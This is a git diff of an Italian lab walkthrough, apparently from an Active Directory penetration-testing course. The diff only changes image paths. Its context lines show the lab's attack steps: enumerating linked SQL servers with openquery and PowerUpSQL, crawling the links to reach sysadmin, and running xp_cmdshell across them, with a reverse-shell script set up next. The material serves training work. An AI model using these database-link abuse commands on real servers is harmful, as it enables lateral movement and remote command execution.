@@ -1,6 +1,6 @@
 # LEARNING OBJECTIVE22
 
-<figure><img src="../.gitbook/assets/image (15) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (15) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Get a reverse shell on a SQL server in eurocorp forest by abusing\
   database links from dcorp-mssql.
@@ -17,7 +17,7 @@ C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
 Import-Module C:\AD\Tools\PowerUpSQL-master\PowerUpSQL.psd1
 ```
 
-<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
 
 Quindi, possiamo collegarci a dcorp-mssql. Utilizzando il client HeidiSQL, effettuiamo il login a dcorp-mssql utilizzando l'autenticazione Windows di studentx. Dopo il login, elenchiamo i database collegati su dcorp-mssql:
 
@@ -25,7 +25,7 @@ Quindi, possiamo collegarci a dcorp-mssql. Utilizzando il client HeidiSQL, effet
 select * from master..sysservers
 ```
 
-<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
 
 Quindi, esiste un collegamento al database dcorp-sql1 da dcorp-mssql. Enumerare ulteriori collegamenti da dcorpsql1. Ciò può essere fatto con l'aiuto di openquery:
 
@@ -33,7 +33,7 @@ Quindi, esiste un collegamento al database dcorp-sql1 da dcorp-mssql. Enumerare 
 select * from openquery("DCORP-SQL1",'select * from master..sysservers')
 ```
 
-<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
 
 È possibile fare nested openquery all'interno di un altro openquery, il che ci porta a dcorp-mgmt:
 
@@ -41,7 +41,7 @@ select * from openquery("DCORP-SQL1",'select * from master..sysservers')
 select * from openquery("DCORP-SQL1",'select * from openquery("DCORP-MGMT",''select * from master..sysservers'')')
 ```
 
-<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
 
 È inoltre possibile utilizzare Get-SQLServerLinkCrawl per eseguire automaticamente la scansione dei collegamenti al database:
 
@@ -49,7 +49,7 @@ select * from openquery("DCORP-SQL1",'select * from openquery("DCORP-MGMT",''sel
 Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
 ```
 
-<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
 
 Fantastico! Abbiamo un sysadmin (sa) sul server eu-sql!
 
@@ -59,7 +59,7 @@ Se xp\_cmdshell è abilitato (o RPC out è abilitato, che in questo caso è impo
 Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'set username'"
 ```
 
-<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Creare Invoke-PowerShellTcpEx.ps1:
 
